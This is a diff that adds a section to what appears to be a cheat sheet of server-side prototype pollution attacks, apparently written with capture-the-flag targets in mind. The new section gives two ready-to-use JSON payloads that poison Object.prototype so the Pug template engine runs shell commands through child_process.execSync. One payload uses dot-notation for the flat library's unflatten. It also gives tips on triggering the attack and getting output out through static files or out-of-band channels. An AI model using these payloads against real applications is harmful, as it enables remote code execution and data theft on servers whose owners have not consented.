@@ -1115,6 +1115,28 @@ This makes `socket.remoteAddress` return the polluted value, bypassing IP-based 
 ```
 Use Burp Collaborator DNS to confirm OOB execution.
 
+### Pug Template Engine AST Injection (SSPP → RCE)
+```json
+{
+  "__proto__": {
+    "block": {
+      "type": "Text",
+      "line": "process.mainModule.require('child_process').execSync('id > /app/static/out.txt')"
+    }
+  }
+}
+```
+With `flat@5.0.0` unflatten (dot-notation):
+```json
+{
+  "__proto__.block.type": "Text",
+  "__proto__.block.line": "process.mainModule.require('child_process').execSync('cp /app/flag* /app/static/f.txt')"
+}
+```
+- Pollution persists per-process (one shot — restart needed to clear)
+- Output goes to `pug_debug_line` assignment, NOT template buffer — exfiltrate via static dir write, error channel, or OOB
+- Requires `pug.compile()` to be called after pollution
+
 ### Kibana CVE-2019-7609 pattern
 Pollute label prototype → inject env vars → `child_process` shell execution. Canonical SSPP RCE reference.
 
